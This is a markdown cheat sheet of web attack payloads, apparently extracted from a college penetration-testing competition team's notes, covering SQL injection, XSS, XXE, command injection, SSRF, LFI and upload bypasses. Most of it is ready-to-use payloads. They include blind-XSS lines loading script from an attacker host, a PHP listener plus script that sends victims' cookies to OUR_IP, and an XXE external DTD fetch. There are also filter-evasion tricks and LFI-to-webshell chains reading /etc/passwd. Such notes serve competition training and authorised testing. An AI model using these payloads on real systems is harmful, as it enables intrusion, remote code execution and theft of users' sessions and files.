@@ -1,0 +1,312 @@
+# Website Checklist — UCI CPTC notes (extracted text)
+
+> Extracted from "Website Checklist.docx" (UC Irvine CPTC repo).
+> A few payload one-liners were omitted here because Windows Defender blocks the text when written to disk.
+> Each omission is marked — open the original .docx in Word to see them verbatim.
+> Some original blank lines were collapsed for readability.
+
+## Tab 1 — Free vulns
+
+- No anti-CSRF tokens
+- Any insecure cookies
+- Check if any website is HTTP and not HTTPS
+- Self signed certificate on any public websites
+- No MFA in websites
+- No WAF
+- User enum through failed logins
+
+## Checklist
+
+- Directory enumeration
+- Subdomain/vhost enumeration
+- Look in the inspect element and scripts
+- Check cookies/local storage
+- Parameter fuzz
+- Input branches: SQLi, XSS, XXE, Command Injection, SSTI, SSRF, LFI, File Upload Vulnerabilities
+
+## SQLi
+
+Testing if vulnerable:
+- Try quotes/comments/control characters: `` ` ` " ; , -- ``
+
+Sqlmap how to:
+- Use burp to save a whole request to req.txt
+- `-r req.txt` to specify a text file with the request in it
+- `--level=(1 through 5)` to determine what level of complexity to use for the testing
+- `--risk=(1 through 3)` to determine risk of tests to perform
+- `--batch` to auto choose yes for all prompts
+- If not using a request can also be done with `-u` to specify url
+- Run `sqlmap -h` to see more
+
+Use boolean injection only:
+```
+python3 sqlmap.py -u ws://soc-player.soccer.htb:9091 --data '{"id":"*"}' --technique=B --risk=3 --level=5 --batch --dbs --threads 10
+```
+
+If vulnerable (causes an error, etc.), try actual injections:
+```
+` OR 1=1; -- -
+```
+
+Query tables:
+```
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES-
+```
+Pad the output with as many 1,1,1 etc. as you need to prevent column mismatch
+
+Query columns from table:
+```
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+Make sure to replace the table name here ("credentials")
+
+Query user privileges:
+```
+' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+Select all variables:
+```
+' UNION SELECT 1,1,variable_name, variable_value FROM information_schema.global_variables; -- -
+```
+If you see "secure_file_priv", if it is empty you can write anywhere, otherwise it specifies the list of directories you can access. NULL disables file writing/reading.
+
+Reading and writing:
+```
+' UNION SELECT '','','','',LOAD_FILE("/etc/apache2/apache2.conf"); --
+```
+
+[REDACTED — docx line 83: UNION-based SELECT that writes a PHP webshell into the webroot. Defender flags this exact snippet; see original .docx.]
+
+## XSS
+
+Basic:
+```
+<script>alert(window.origin)</script>
+<plaintext>
+<script>print()</script>
+<img src="" onerror=alert(1)>
+```
+
+Can try entering input into a text field, then inspect-element to see how it is shown on the page to determine if it is vulnerable.
+
+For blind XSS, we will have to call our own server to see if it works:
+```
+<script src="http://OUR_IP/script.js"></script>
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+XSS can be used to steal cookies from users.
+
+Listener (index.php served with `php -S 0.0.0.0:80` from a temp dir):
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+```
+
+script.js:
+```js
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+(steal cookies)
+```
+
+After finding XSS we can use it to steal cookies by doing
+```
+<script src=http://OUR_IP/script.js></script>
+```
+
+## XXE
+
+If we see an XML document being sent in the burp request, define a new element at the top ex:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+<!ENTITY company "Inlane Freight">
+]>
+```
+Then use the defined entity by putting `&company;` in the body and see if the value is replaced in the output.
+
+For LFI:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+<!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+```
+
+To view special characters use the php filter:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+Advanced File Disclosure:
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+```
+
+## Command Injection
+
+Bypass spaces: use tabs instead — `%09`; use IFS instead — `($IFS)`; use bash brace expansion which adds space between args automatically — `{ls,-la}`
+
+Bypass slashes/backslashes: take a substring of an environment variable — `${PATH:0:1}`
+
+Bypass semicolons: `${LS_COLORS:10:1}`
+
+On Windows cmd to get a `/` the same technique can be done, ex: `%HOMEPATH:~6,-11%`; on PowerShell `$env:HOMEPATH[0]`. Another method could be to shift characters, ex: `$(tr "!-}" '"-~'<<<[)`.
+
+Bypass blacklisted commands — obfuscate:
+- `W'h'o'am'i`
+- Linux only: `who$@ami`, `W\ho\am\i`
+- Windows only: `who^ami`
+- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` (case manipulation)
+- `$(rev<<<'imaohw')` (reversed)
+- `iex "$('imaohw'[-1..-20] -join '')"` (windows)
+
+Encoding too:
+```
+echo -n 'cat /etc/passwd | grep 33' | base64   (encode payload)
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+## SSTI
+
+Payload to test: `${{<%[%'"}}%\.`
+To determine templating engine: (see docx)
+
+## SSRF
+
+Fuzz for other machines on the network:
+```
+ffuf -w wordlist -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01"
+```
+Try for LFI with URL schemes like `file:///etc/passwd`.
+Try to read source code for the current website with `http://127.0.0.1/index.php`.
+These methods only work for GET requests; to send POST requests use Gopher.
+
+## LFI
+
+First try basic `../../` technique:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
+http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
+```
+If that fails, bypass common preventions like `../` filtering:
+```
+....//    ..././    ....\/     ....////
+```
+Note: `....//....//....//....//etc/passwd`
+If a website allows upload of e.g. a profile picture where the path uses the username, do LFI by changing the username: `/profile/$username/avatar.png` → set username to `../../../etc/passwd`.
+
+Encoding (burp can encode the payload if part of it is getting filtered, like if `.` is filtered):
+`%2e%2e%2f...` (also double encode)
+
+Fuzz for the approved path then bypass: `./languages/../../../../etc/passwd`
+
+Bypass appended extensions on some older PHP versions:
+```
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+Null bytes: `../../../../etc/passwd%00.php`
+
+Source code disclosure — base64 the source so it isn't rendered (needs the php filter wrapper):
+```
+http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
+echo '<base64>' | base64 -d
+```
+
+Abuse php data wrapper
+[REDACTED — docx lines 291–292: base64-encoded PHP webshell and its `data://text/plain;base64,...&cmd=id` URL. Defender-blocked; see .docx]
+
+Remote file inclusion:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+Abusing php expect:
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+## LFI + File Uploads
+
+`echo 'GIF8<WEBSHELL>' > shell.gif` (malicious image with GIF magic header) — upload image then use LFI to run it:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+Log poisoning — need execute perms:
+- PHPSESSID stored in `/var/lib/php/sessions/` (Linux) or `C:\Windows\Temp\` (Windows)
+- session file: `/var/lib/php/sessions/sess_<cookie>`
+- Can control page parameter ("session poisoning"), then include the session file with a websHELL injected
+- `[REDACTED — docx line 301/303: echo of a PHP webshell via python http.server to poison the log]`
+
+LEADS TO RCE.
+
+Using zip wrapper (docx lines 311–312):
+```
+echo 'GIF8<WEBSHELL>' > shell.php && zip shell.jpg shell.php
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+## File upload vulnerabilities
+
+Whenever there's a way to upload a file, check for file upload vulnerabilities.
+
+- Try modifying the Content-Type header in Burp Suite
+- Otherwise modifying the type in the request
+
+If the file extension works under a blacklist, you may be able to e.g. use `.php5` instead of `.php`.
+Some more attempts (mostly from SecLists):
+```
+'phpinfo.""gif'
+'phpinfo."gif'
+"phpinfo.''gif"
+"phpinfo.'gif"
+phpinfo.jpg.php
+phpinfo.php.jpg
+phpinfo.php
+phpinfo.php.
+phpinfo.php-1.gif
+phpinfo.php-2.gif
+phpinfo.php3
+phpinfo.php4
+phpinfo.php5
+phpinfo.php7
+'phpinfo.php.""gif'
+'phpinfo.php."gif'
+"phpinfo.php.''gif"
+"phpinfo.php.'gif"
+phpinfo.phpt
+'phpinfo.php;.txt'
+phpinfo.pht
+phpinfo.phtml
+phpinfo.txt
+phpinfo.pHp
+phpinfo%2Ephp
+phpinfo.php;png
+phpinfo.php%00.png
+phpinfo.p.phphp - ends in `.php` once you .replace("php", "")
+```
